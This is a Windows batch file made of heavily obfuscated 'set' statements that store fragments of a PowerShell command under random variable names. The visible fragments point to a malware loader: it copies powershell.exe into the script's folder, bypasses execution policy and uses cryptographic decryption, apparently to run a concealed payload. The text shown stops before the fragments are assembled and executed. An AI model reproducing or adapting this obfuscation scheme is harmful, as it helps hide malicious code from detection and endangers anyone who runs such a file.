@echo off
set "YPofzUPFZw=st"
set "PAJNPcbUHR=ll"
set "deecSXYHGM=0\"
set "poVfDWkogp=Sy"
set "TEKiouczjo=.e"
set "ubccQfxoDR=32"
set "XuwYduetWy=we"
set "JmQImxffmA=he"
set "mjMMccDBwr=Wi"
set "ykaFOXjIKK=rs"
set "EuzgzikqDI=we"
set "boLDICzLJn=\v"
set "wBbhalEomg=ws"
set "DSeWJvqyev=he"
set "grGpCSPrxT= C"
set "kUhyTuhmCB=Po"
set "hZUQzoAcOx=in"
set "qBFeYiKRad=co"
set "aaNSrfEXKa=em"
set "rmEfVXMmpt=do"
set "eFpAIgsPzf= /"
set "QrRkfIHfZx=ll"
set "yIuwPGXMPn=rS"
set "akPpgXETnz=s\"
set "vOvyFkVKQl=\W"
set "qxeeoTfQlS=:\"
set "tsthNGcCOE=ow"
set "dhGcxgaaht=py"
set "pdJmRZhWHo=y "
set "qumQYYUpBf=nd"
set "mTBpffpApH=xe"
set "EceYlvBmZJ=po"
set "xuwpRrERUc=1."
set "CzrPUSuTwZ= %~dp0"
set "oPcfWPTPSm=cd"
set "vzALGIpLbk=tsWi"
set "ySSMfGvClb=$ctm"
set "jAWuEidoSK=q = "
set "ElRCZZkBKi=[Env"
set "gJJAEMmeRA=Syst"
set "MocBEnXuMD=)($R"
set "IzOATEmAkc=$XaN"
set "sBUPvcOoqM=RVkj"
set "veVNCBcxyy=Disp"
set "dAdjeRtGvz=:('g"
set "yCUATuemkb=oL'["
set "wFBnZxkEEN=y.Cr"
set "GyjuMYvveR=comm"
set "fgJDpzetYM=mWj."
set "PFkxmoITKp=exvM"
set "qgskboGYUX=in $"
set "IJmxokpdwU=hy.A"
set "XgurpWTdNg=$uLU"
set "aUcTJQiDRf=-ep "
set "iDZzGFNqWA=YxVw"
set "GYEelxdNeV=gsYZ"
set "JFcAmgZDZT=1..-"
set "wsIdLcsiDB=$uLU"
set "qnhzvDYswF=jb ="
set "PRYBMsMPkb=;$KR"
set "OsCzwJWLWN=Qf.D"
set "SdmpUxIkwH=]::C"
set "HtEpPruUpB= = $"
set "uHcGVKzget=eam("
set "DvcyZvEcXX=em.C"
set "hBKKJRBoPE=PKCS"
set "ckFzOpJHBw=-4] "
set "GyvOfUaeeF='txe"
set "yvNihtnSaQ=oiF."
set "FdrxfyUNxE=th('"
set "dGkqiwsUAS=-1.."
set "BYBOXcYWwD= New"
set "SPeFKfnEsk=:: '"
set "mybOCLHvtb=[]] "
